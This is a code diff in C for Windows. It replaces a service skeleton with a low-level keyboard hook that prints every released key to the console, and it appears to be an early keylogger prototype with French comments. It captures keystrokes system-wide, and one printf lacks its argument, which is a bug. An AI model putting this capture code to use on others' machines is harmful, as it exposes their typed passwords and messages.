@@ -3,25 +3,32 @@
 #include <windows.h>
 #include <winsvc.h>
 
-void WINAPI ServiceCtrlHandler(DWORD control) {
+LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
+{
+	int vkCode = ((KBDLLHOOKSTRUCT *)lparam)->vkCode;
 
+	if (wparam == 257) // when released
+	{
+		if (vkCode >= 65 && vkCode <= 90)
+			printf("Pressed: %c\n", vkCode);
+		else
+			printf("Pressed: <%u>\n");
+	}
+	return (CallNextHookEx(NULL, ncode, wparam, lparam));
 }
 
-void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
-    SERVICE_STATUS_HANDLE   statusHandle;
+int main(void)
+{
+	HHOOK hook = SetWindowsHookEx(
+		WH_KEYBOARD_LL, // Type de hook
+		foo,			// Fonction a appeler
+		NULL,			// Ou trouver la fonction (null car osef)
+		0);				// Thread ID
+	MSG msg;
 
-    statusHandle = RegisterServiceCtrlHandler(TEXT("NameService"), ServiceCtrlHandler);
-}
-
-int main(int ac, char **av) {
-    if (ac > 1) { // launched by user
-
-    } else { // launched by SCM
-        SERVICE_TABLE_ENTRY serviceTable[] =
-        {
-            {"NameService", ServiceMain},
-            {NULL, NULL}
-        };
-        StartServiceCtrlDispatcher(serviceTable);
-    }
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		TranslateMessage(&msg); // jsp ca fais quoi sah
+	}
+	printf("haha\n");
 }
